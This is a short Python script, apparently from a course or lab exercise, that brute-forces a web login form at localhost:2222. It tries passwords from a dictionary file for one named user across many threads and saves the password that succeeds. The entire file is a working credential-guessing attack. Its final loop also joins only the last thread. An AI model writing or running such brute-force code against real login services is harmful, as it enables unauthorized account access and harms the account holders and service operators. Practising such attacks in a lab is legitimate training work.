import os
import threading
import time

import requests

user = "V_Jameal49"
target = "http://localhost:2222"

def crack(threadId, user, passwords, target):
    for password in passwords:
        response = requests.post(target, data={'username': user, 'password': password, 'submit': 'Sign In'})
        if "You Logged In!!" in response.text:
            with open('Q2.txt', 'w') as f:
                f.write(password)
            os._exit(1)
    
    print(f"[*] Thread {threadId} terminated")

with open("Q2dictionary", "r") as f:
    i = 1

    # make an array with all the passwords
    passwords = f.read().splitlines()

    # split passwords into 200 chunks
    chunks = [passwords[i:i + 200] for i in range(0, len(passwords), 200)]

    print(f"Processing using {len(chunks)} threads.")

    # create a thread for each chunk
    threadId = 0
    for passwords in chunks:
        t = threading.Thread(target=crack, args=(threadId, user, passwords, target))
        t.start()
        time.sleep(0.5)
        threadId += 1

    for passwords in chunks:
        t.join()